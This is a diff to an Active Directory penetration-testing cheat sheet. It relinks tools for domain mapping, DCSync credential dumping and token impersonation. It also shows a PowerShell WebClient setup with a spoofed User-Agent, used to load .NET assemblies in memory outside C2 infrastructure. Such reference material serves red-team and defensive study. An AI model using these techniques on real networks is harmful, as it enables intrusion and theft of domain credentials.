@@ -2,8 +2,8 @@
 
 ## Tools
 
-- Bloodhound
-* [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerView)
+- [Bloodhound](https://github.com/BloodHoundAD/BloodHound) with [Sharphound injestor](https://github.com/BloodHoundAD/SharpHound3) or [bloodhound-python injestor](https://github.com/fox-it/BloodHound.py)
+- [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerView)
 - [RSAT](https://download.microsoft.com/download/1/D/8/1D8B5022-5477-4B9A-8104-6A71FF9D98AB/WindowsTH-RSAT_WS_1709-x64.msu)
 > After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
 
@@ -29,13 +29,13 @@ meterpreter > dcsync_ntlm <DOMAIN>\<user>
 ## Impersonation Token 
 
 ### Tools
-- [Rubeus.exe](https://github.com/GhostPack/Rubeus)
+- [Rubeus.exe](https://github.com/GhostPack/Rubeus) (DOTNET CSHARP)
+- [Tokenvator](https://github.com/0xbadjuju/Tokenvator) (DOTNET CSHARP)
 - [Incognito.exe](https://github.com/FSecureLABS/incognito) (Meterpreter extension)
-- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 - [TokenManipulation.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1)
-- [Tokenvator](https://github.com/0xbadjuju/Tokenvator) (.NET CSHARP C#)
+- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
 
-Reflectively load .NET Assembly within Powershell (or Cobalt, SilentTrinity etc.) if you cant do it through your C2 Infra :
+Reflectively load DOTNET CSHARP Assembly within Powershell (or Cobalt, SilentTrinity etc.) if you cant do it through your C2 Infra :
 
 ```powershell
 $wc=New-Object System.Net.WebClient;$wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0");$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials
@@ -104,8 +104,8 @@ Get-ADComputer -Identity <computer_name> -Properties TrustedForDelegation
 
 ### Manual testing
 
-[secureauth.com](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/)
+- [secureauth.com](https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/)
 
 ### Delegation Explained
 
-[specterops](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
+- [specterops.io](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
